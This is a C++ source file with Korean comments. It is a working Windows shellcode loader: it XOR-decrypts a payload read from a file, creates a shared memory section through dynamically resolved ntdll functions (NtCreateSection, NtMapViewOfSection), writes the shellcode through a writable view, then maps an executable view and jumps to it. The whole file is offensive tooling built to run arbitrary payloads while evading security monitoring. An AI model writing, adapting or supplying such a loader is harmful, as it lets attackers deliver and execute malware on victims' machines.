#include <windows.h>
#include <stdio.h>
#include <vector>
#include <thread>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* NtCreateSection_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

const BYTE XOR_KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xFF };

bool DecryptShellcodeFromFile(const char* filepath, std::vector<BYTE>& out) {
    FILE* fp = nullptr;
    if (fopen_s(&fp, filepath, "rb") != 0 || !fp) {
        printf("[-] 경로가 유효하지 않음: %s\n", filepath);
        return false;
    }

    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (size == 0) {
        printf("[-] 파일이 비어 있음.\n");
        fclose(fp);
        return false;
    }

    out.resize(size);
    fread(out.data(), 1, size, fp);
    fclose(fp);

    for (size_t i = 0; i < size; ++i)
        out[i] ^= XOR_KEY[i % sizeof(XOR_KEY)];

    printf("[+] 쉘코드 파일 복호화 완료 (크기: %zu 바이트)\n", size);
    return true;
}

// 전역 공유 핸들
HANDLE g_hSection = NULL;
SIZE_T g_shellcodeSize = 0;

// 쉘코드를 섹션에 복사하는 스레드
void WriterThread(std::vector<BYTE> shellcode) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdll, "NtMapViewOfSection");

    LPVOID localBase = NULL;
    SIZE_T viewSize = 0;
    NTSTATUS status = NtMapViewOfSection(g_hSection, GetCurrentProcess(), &localBase, 0, 0,
        NULL, &viewSize, 2, 0, PAGE_READWRITE);
    if (status != 0 || !localBase) {
        printf("[-] WriterThread: 섹션 매핑 실패 (0x%08X)\n", status);
        return;
    }

    memcpy(localBase, shellcode.data(), shellcode.size());
    printf("[+] WriterThread: 쉘코드 섹션에 복사 완료: %p\n", localBase);
}


// 쉘코드를 실행하는 스레드
void ExecutorThread() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdll, "NtMapViewOfSection");

    LPVOID execBase = NULL;
    SIZE_T viewSize = 0;
    NTSTATUS status = NtMapViewOfSection(g_hSection, GetCurrentProcess(), &execBase, 0, 0,
        NULL, &viewSize, 2, 0, PAGE_EXECUTE_READWRITE); // 수정됨

    if (status != 0 || !execBase) {
        printf("[-] ExecutorThread: 섹션 매핑 실패 (0x%08X)\n", status);
        return;
    }

    printf("[+] ExecutorThread: 매핑 완료. 쉘코드 실행 위치: %p\n", execBase);
    ((void(*)())execBase)();  // 실행
}

int main() {
    char path[MAX_PATH] = { 0 };
    printf("file path : ");
    scanf_s("%s", path, (unsigned)_countof(path));

    std::vector<BYTE> shellcode;
    if (!DecryptShellcodeFromFile(path, shellcode)) return 1;
    g_shellcodeSize = shellcode.size();

    // NtCreateSection
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSection = (NtCreateSection_t)GetProcAddress(ntdll, "NtCreateSection");

    LARGE_INTEGER maxSize = { 0 };
    maxSize.QuadPart = g_shellcodeSize;

    NTSTATUS status = NtCreateSection(&g_hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (status != 0 || !g_hSection) {
        printf("[-] NtCreateSection 실패 (0x%08X)\n", status);
        return 1;
    }

    printf("[+] 공유 섹션 생성 완료\n");

    // WriterThread → 쉘코드 복사
    std::thread t1(WriterThread, shellcode);
    t1.join();

    // ExecutorThread → 쉘코드 실행
    std::thread t2(ExecutorThread);
    t2.join();

    CloseHandle(g_hSection);
    return 0;
}
